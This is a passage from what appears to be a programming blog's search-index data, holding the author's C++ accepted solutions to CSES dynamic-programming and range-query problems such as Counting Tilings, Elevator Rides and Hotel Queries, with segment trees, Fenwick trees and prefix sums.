int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n;    cin &gt;&gt; n;    vi arr;    rep(i, 1, n){        int num;        cin &gt;&gt; num;        if(arr.empty()) arr.eb(num);        else if(num&gt;arr.back()) arr.eb(num);        else *lower_bound(all(arr), num) = num;    }cout &lt;&lt; arr.size() &lt;&lt; '\\n';    return 0;}\nProjects \nProjects#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int bit[400005];int n;void modify(int pos, int val) {    for (; pos &lt;= 2 * n+1; pos += (pos &amp; -pos))        tomax(bit[pos], val);}int query(int pos) {    int ans = 0;    for (; pos &gt; 0; pos -= (pos &amp; -pos)) tomax(ans, bit[pos]);    return ans;}signed main() {    ios;    cin &gt;&gt; n;    vector&lt;pair&lt;pii, int&gt;&gt; p(n);    vi ord;    for (auto &amp;i : p)        cin &gt;&gt; i.F.F &gt;&gt; i.F.S &gt;&gt; i.S, ord.eb(i.F.F), ord.eb(i.F.S);    sort(all(p));    sort(all(ord));    for (auto &amp;i : p) {        i.F.F = (int)(lower_bound(all(ord), i.F.F) - ord.begin())+1;        i.F.S = (int)(lower_bound(all(ord), i.F.S) - ord.begin())+1;        modify(i.F.S, query(i.F.F - 1) + i.S);        // err(i.F.F sp i.F.S sp query(i.F.F - 1) sp query(i.F.S));    }    cout &lt;&lt; query(2 * n+1) &lt;&lt; '\\n';    return 0;}\nElevator Rides \nElevator Rides#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; ++i)#define rev(i, a, b) for(int i = a; i&gt;=b; --i)#define tomax(a, b) (a)=max((a),(b))#define tomin(a, b) (a)=min((a),(b))#define all(a) a.begin(), a.end()#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std;void bit_out(int num, int digit, bool reverse){    if(!reverse)        rev(i, digit-1, 0)            cout &lt;&lt; ((num &amp; (1&lt;&lt;i))!=0) &lt;&lt; ' ';    else rep(i, 0, digit-1)            cout &lt;&lt; ((num &amp; (1&lt;&lt;i))!=0) &lt;&lt; ' ';    cout &lt;&lt; '\\n';}// dp[i][0] : minimum rides// dp[i][1] : minimum weight// init// dp[i][0] = n// dp[i][1] = INT_MAX// dp[0][0] = 1, dp[0][1] = 0// new_weight = dp[i^(1&lt;&lt;j)][1] + w[j]              , j in i// dp[i][0] = min(dp[i^(1&lt;&lt;j)][0] + new_weight&gt;x)   , j in i// dp[i][1] = dp[i][0]_update ? min(dp[i][1], new_weight) : dp[i][1]    , dp[i][0]==dp[i][0]_ori &amp;&amp; new_weight&lt;=x// dp[i][1] = dp[i][0]_update ? new_weight : dp[i][1]                   , dp[i][0]&lt;dp[i][0]_ori &amp;&amp; new_weight&lt;=x// dp[i][1] = dp[i][0]_update ? w[j] : dp[i][1]                         , dp[i][0]&lt;=dp[i][0]_ori &amp;&amp; new_weight&gt;xint dp[1&lt;&lt;21][3];int n, w[22], x;signed main(){    ios;    cin &gt;&gt; n &gt;&gt; x;    rep(i, 0, n-1) cin &gt;&gt; w[i];    rep(i, 0, 1&lt;&lt;n)        dp[i][0]=n, dp[i][1]=INT_MAX;    dp[0][0] = 1, dp[0][1] = 0;    rep(i, 1, (1&lt;&lt;n)-1){        rep(j, 0, n-1){            if(i &amp; (1&lt;&lt;j)){                int new_weight = (dp[i^(1&lt;&lt;j)][1]) + w[j];                if(dp[i][0] &gt;= dp[i^(1&lt;&lt;j)][0]+(new_weight&gt;x)){                    if(dp[i][0] == dp[i^(1&lt;&lt;j)][0] &amp;&amp; (new_weight&lt;=x))                        dp[i][1] = min(dp[i][1], new_weight);                    else dp[i][1] = new_weight&gt;x ? w[j] : new_weight;                    dp[i][0] = dp[i^(1&lt;&lt;j)][0]+(new_weight&gt;x);                }            }        }//bit_out(i, n, 1), cout &lt;&lt; dp[i][0] &lt;&lt; ' ' &lt;&lt; dp[i][1] &lt;&lt; '\\n';    }    cout &lt;&lt; dp[(1&lt;&lt;n)-1][0] &lt;&lt; '\\n';    return 0;}\nCounting Tilings \nCounting Tilings#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int dp[11][1003][1 &lt;&lt; 11];signed main() {    ios;    int n, m;    cin &gt;&gt; n &gt;&gt; m;    memset(dp, 0, sizeof(dp));    dp[n][0][0] = 1;    rep(i, 1, m) {        rep(j, 0, (1 &lt;&lt; n) - 1) dp[0][i][j &lt;&lt; 1] = dp[n][i - 1][j];        rep(j, 1, n) {            int x = 1 &lt;&lt; (j - 1);            int y = 1 &lt;&lt; j;            rep(set, 0, (1 &lt;&lt; (n + 1)) - 1) {                dp[j - 1][i][set] %= mod;                if ((set &amp; x) &amp;&amp; (set &amp; y)) continue;                if (set &amp; x)                    dp[j][i][set ^ x] += dp[j - 1][i][set];                else if (set &amp; y)                    dp[j][i][set ^ y] += dp[j - 1][i][set];                else {                    dp[j][i][set ^ x] += dp[j - 1][i][set];                    dp[j][i][set ^ y] += dp[j - 1][i][set];                }            }        }    }    cout &lt;&lt; dp[n][m][0] % mod &lt;&lt; '\\n';    return 0;}\n神奇定義 \nCounting Tilings - 神奇定義#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)/*DP[i][j][k]  \\rightarrow \\text{ solution when we're currently at the point $(i,j) $ and first $i$ bits}\\\\\\text{of $k$ correspond to $j$th column and rest of the bits belong to $j-1$ column}*/int mod = 1e9 + 7;int n, m;int dp[11][1003][1024];int pos[] = {0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512};signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    dp[n][0][(1 &lt;&lt; n) - 1] = 1;    rep(j, 1, m) {        rep(k, 0, (1 &lt;&lt; n) - 1) dp[0][j][k] = dp[n][j - 1][k];        rep(i, 1, n) {            rep(k, 0, (1 &lt;&lt; n) - 1) {                (dp[i][j][k] += dp[i - 1][j][k ^ pos[i]]) %= mod;                if (i &amp;&amp; (k &amp; pos[i]) &amp;&amp; (k &amp; pos[i - 1]))                    (dp[i][j][k] += dp[i - 1][j][k ^ pos[i - 1]]) %= mod;            }        }    }    cout &lt;&lt; dp[n][m][(1 &lt;&lt; n) - 1] % mod &lt;&lt; '\\n';    return 0;}\n滾動數組壓成一維 \nCounting Tilings - 滾動數組壓成一維#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int mod = 1e9 + 7;int n, m;int dp[1024][2];int pos[] = {0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512};const int M = 1e9 + 7;bool p = 0;signed main() {    ios;    cin &gt;&gt; n &gt;&gt; m;    dp[(1 &lt;&lt; n) - 1][p] = 1;    rep(j, 1, m) {        rep(i, 1, n) {            rep(k, 0, (1 &lt;&lt; n) - 1) {                (dp[k][!p] = dp[k ^ pos[i]][p]) %= mod;                if (i &amp;&amp; (k &amp; pos[i]) &amp;&amp; (k &amp; pos[i - 1]))                    (dp[k][!p] += dp[k ^ pos[i - 1]][p]) %= mod;            }            p = !p;        }    }    cout &lt;&lt; dp[(1 &lt;&lt; n) - 1][p] % mod &lt;&lt; '\\n';    return 0;}\nCounting Numbers \nCounting Numbers#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int a, b;int dp[20][10], sum[20];void pre() {    rep(i, 0, 9) dp[1][i] = 1;    sum[1] = 10;    rep(i, 2, 18) {        rep(j, 0, 9) {            rep(k, 0, 9) if (j != k) dp[i][j] += dp[i - 1][k];            if (j) sum[i] += dp[i][j];        }    }}int cal(int x) {    if (x &lt;= 0) return x + 1;    int ans = 0;    vector&lt;int&gt; s;    while (x &gt; 0) s.eb(x % 10), x /= 10;    int n = s.size();    s.eb(0);    reverse(s.begin(), s.end());    rev(i, n - 1, 1) ans += sum[i];    rep(i, 1, s[1] - 1) ans += dp[n][i];    rep(i, 1, n - 1) {        rep(j, 0, s[i + 1] - 1) if (j != s[i]) ans += dp[n - i][j];        if (s[i + 1] == s[i]) break;    }    bool ok = true;    rep(i, 1, n - 1) {        if (s[i + 1] == s[i]) ok = false;    }    ans += ok;    return ans;}signed main() {    ios;    pre();    cin &gt;&gt; a &gt;&gt; b;    cout &lt;&lt; cal(b) - cal(a - 1) &lt;&lt; '\\n';    return 0;}\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"CSES Range Queries","url":"/CSES_Range_Queries/","content":"CSES Range Queries \nCSES Range Queries 的 AC 程式碼\n\nCSES Problem Set\n我的 Profile\n我的程式們\nStatic Range Sum Queries \nStatic Range Sum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, q;    cin &gt;&gt; n &gt;&gt; q;    vi pre(n + 1);    pre[0] = 0;    rep(i, 1, n) cin &gt;&gt; pre[i], pre[i] += pre[i - 1];    while (q--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        cout &lt;&lt; pre[b] - pre[a - 1] &lt;&lt; '\\n';    }    return 0;}\nStatic Range Minimum Queries \nStatic Range Minimum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int seg[200005 * 4];int arr[200005];void pull(int id) { seg[id] = min(seg[lc], seg[rc]); }void build(int L, int R, int id) {    if (L == R - 1) {        seg[id] = arr[L];        return;    }    build(L, M, lc), build(M, R, rc);    pull(id);}int query(int l, int r, int L, int R, int id){    if(l==L &amp;&amp; r==R) return seg[id];    if(l&gt;=M) return query(l, r, M, R, rc);    if(r&lt;=M) return query(l, r, L, M, lc);    return min(query(l, M, L, M, lc), query(M, r, M, R, rc));}signed main() {    ios;    int n, q;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n-1) cin &gt;&gt; arr[i];    build(0, n, 0);    while(q--){        int a, b;        cin &gt;&gt; a &gt;&gt; b;        cout &lt;&lt; query(a-1, b, 0, n, 0) &lt;&lt; '\\n';     }    return 0;}\nDynamic Range Sum Queries \nDynamic Range Sum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0) #define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2) int seg[200005 * 4];int arr[200005]; void pull(int id) { seg[id] = seg[lc] + seg[rc]; } void modify(int pos, int val, int L, int R, int id) {    if (L == R - 1) {        seg[id] = val;        return;    }    if (pos &gt;= M)        modify(pos, val, M, R, rc);    else        modify(pos, val, L, M, lc);    pull(id);} int query(int l, int r, int L, int R, int id) {    if (l == L &amp;&amp; r == R) return seg[id];    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return query(l, M, L, M, lc) + query(M, r, M, R, rc);} signed main() {    ios;    int n, q;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; arr[i], modify(i, arr[i], 0, n, 0);    while (q--) {        int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        a--;        if (cmd == 1)            modify(a, b, 0, n, 0);        else            cout &lt;&lt; query(a, b, 0, n, 0) &lt;&lt; '\\n';    }    return 0;}\nDynamic Range Minimum Queries \nDynamic Range Minimum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int seg[200005 * 4];void pull(int id) { seg[id] = min(seg[lc], seg[rc]); }void modify(int pos, int val, int L, int R, int id) {    if (L == R - 1) {        seg[id] = val;        return;    }    if (pos &gt;= M)        modify(pos, val, M, R, rc);    else        modify(pos, val, L, M, lc);    pull(id);}int query(int l, int r, int L, int R, int id) {    if (l == L &amp;&amp; r == R) return seg[id];    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return min(query(l, M, L, M, lc), query(M, r, M, R, rc));}signed main() {    ios;    int n, q, tmp;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; tmp, modify(i, tmp, 0, n, 0);    while (q--) {        int cmd, a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        a--;        if (cmd == 1)            modify(a, b, 0, n, 0);        else            cout &lt;&lt; query(a, b, 0, n, 0) &lt;&lt; '\\n';    }    return 0;}\nRange Xor Queries \nRange Xor Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, q, tmp;    cin &gt;&gt; n &gt;&gt; q;    vi arr(n + 1);    arr[0] = 0;    rep(i, 1, n) cin &gt;&gt; tmp, arr[i] = (tmp ^ arr[i - 1]);    while (q--) {        int a, b;        cin &gt;&gt; a &gt;&gt; b;        cout &lt;&lt; (arr[b] ^ arr[a - 1]) &lt;&lt; '\\n';    }    return 0;}\nRange Update Queries \nRange Update Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)struct Nodes {    int sum, lz;} seg[200005 * 4];void modify(int l, int r, int val, int L, int R, int id) {    if (l == L &amp;&amp; r == R) {        seg[id].lz += val;    } else {        if (l &gt;= M)            modify(l, r, val, M, R, rc);        else if (r &lt;= M)            modify(l, r, val, L, M, lc);        else modify(l, M, val, L, M, lc), modify(M, r, val, M, R, rc);    }}int query(int pos, int L, int R, int id) {    if (L == R - 1) return seg[id].lz + seg[id].sum;    if (pos &gt;= M)        return seg[id].lz + query(pos, M, R, rc);    else        return seg[id].lz + query(pos, L, M, lc);}signed main() {    ios;    int n, q, tmp;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 0, n - 1) cin &gt;&gt; tmp, modify(i, i + 1, tmp, 0, n, 0);    while (q--) {        int cmd, a, b, c;        cin &gt;&gt; cmd &gt;&gt; a;        a--;        if(cmd == 1) cin &gt;&gt; b &gt;&gt; c, modify(a, b, c, 0, n, 0);        else cout &lt;&lt; query(a, 0, n ,0) &lt;&lt; '\\n';    }    return 0;}\nForest Queries \nForest Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)int pre[1003][1003];signed main() {    ios;    int n, q;    char tmp;    cin &gt;&gt; n &gt;&gt; q;    rep(i, 1, n) rep(j, 1, n) cin &gt;&gt; tmp,        pre[i][j] =            (tmp == '*') + pre[i - 1][j] + pre[i][j - 1] - pre[i - 1][j - 1];    while(q--){        int x1, x2, y1, y2;        cin &gt;&gt; y1 &gt;&gt; x1 &gt;&gt; y2 &gt;&gt; x2;        if(x2&lt;x1) swap(x1, x2);        if(y2&lt;y1) swap(y1, y2);        cout &lt;&lt; pre[y2][x2] + pre[y1-1][x1-1] - pre[y2][x1-1] - pre[y1-1][x2] &lt;&lt; '\\n';    }    return 0;}\nHotel Queries \nHotel Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)#define lc id * 2 + 1#define rc id * 2 + 2#define M ((L + R) / 2)int seg[200005 * 4];void modify(int pos, int val, int L, int R, int id) {    if (L == R - 1)        seg[id] += val;    else {        if (pos &gt;= M)            modify(pos, val, M, R, rc);        else            modify(pos, val, L, M, lc);        seg[id] = max(seg[lc], seg[rc]);    }}int query(int l, int r, int L, int R, int id) {    if (l == L &amp;&amp; r == R) return seg[id];    if (l &gt;= M) return query(l, r, M, R, rc);    if (r &lt;= M) return query(l, r, L, M, lc);    return max(query(l, M, L, M, lc), query(M, r, M, R, rc));}signed main() {    // ios;    int n, m, tmp;    cin &gt;&gt; n &gt;&gt; m;    set&lt;pii&gt; h;    rep(i, 0, n - 1) cin &gt;&gt; tmp, modify(i, tmp, 0, n, 0);    rep(i, 1, m) {        cin &gt;&gt; tmp;        if (query(0, n, 0, n, 0) &lt; tmp) {            cout &lt;&lt; 0 &lt;&lt; ' ';            continue;        }        int l = 1, r = n;        while (r &gt; l) {            int mid = (r + l) / 2;            if (query(0, mid, 0, n, 0) &gt;= tmp)                r = mid;            else                l = mid+1;        }cout &lt;&lt; r &lt;&lt; ' ';        modify(r-1, -tmp, 0, n, 0);    }    return 0;}\nList Removals \nList Removals#include &lt;bits/extc++.h&gt;using namespace std;using namespace __gnu_pbds;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)signed main() {    ios;    int n, tmp;    tree&lt;pii, null_type, less&lt;pii&gt;, rb_tree_tag,         tree_order_statistics_node_update&gt;        r;    cin &gt;&gt; n;    rep(i, 1, n) cin &gt;&gt; tmp, r.insert({i, tmp});    rep(i, 1, n) {        cin &gt;&gt; tmp;        auto it = r.find_by_order(tmp - 1);        cout &lt;&lt; it-&gt;S &lt;&lt; ' ';        r.erase(it);    }    return 0;}\nSalary Queries \nSalary Queries#include &lt;bits/extc++.h&gt;using namespace std;using namespace __gnu_pbds;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define vii vector&lt;pii&gt;#define mii map&lt;int, int&gt;#define si set&lt;int&gt;/* UTILS */#define rep(i, a, b) for (int i = a; i &lt;= b; ++i)#define rev(i, a, b) for (int i = a; i &gt;= b; --i)#define tomax(a, b) (a) = max((a), (b))#define tomin(a, b) (a) = min((a), (b))#define all(a) a.begin(), a.end()#define rall(a) (a).rbegin(), (a).rend()#define pob pop_back#define pb push_back#define eb emplace_back#define ins insert#define err(a) cerr &lt;&lt; #a &lt;&lt; \": \" &lt;&lt; a &lt;&lt; \"\\n\"#define sp &lt;&lt; \" \" &lt;&lt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)template &lt;class T&gt;using Tree = tree&lt;T, null_type, less_equal&lt;T&gt;, rb_tree_tag,                  tree_order_statistics_node_update&gt;;signed main() {    ios;    int n, q;    Tree&lt;int&gt; tr;    int arr[200005];    cin &gt;&gt; n &gt;&gt; q;    rep(i, 1, n) cin &gt;&gt; arr[i], tr.insert(arr[i]);    while (q--) {        char cmd;        int a, b;        cin &gt;&gt; cmd &gt;&gt; a &gt;&gt; b;        if (cmd == '!')            tr.erase(tr.find_by_order(tr.order_of_key(arr[a]))), tr.insert(b), arr[a]=b;        else            cout &lt;&lt; tr.order_of_key(b + 1) - tr.order_of_key(a) &lt;&lt; '\\n';    }    return 0;}\nPrefix Sum Queries \nPrefix Sum Queries#include &lt;bits/stdc++.h&gt;using namespace std;/* TYPES  */#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define vc vector#define vi vector&lt;int&gt;#define 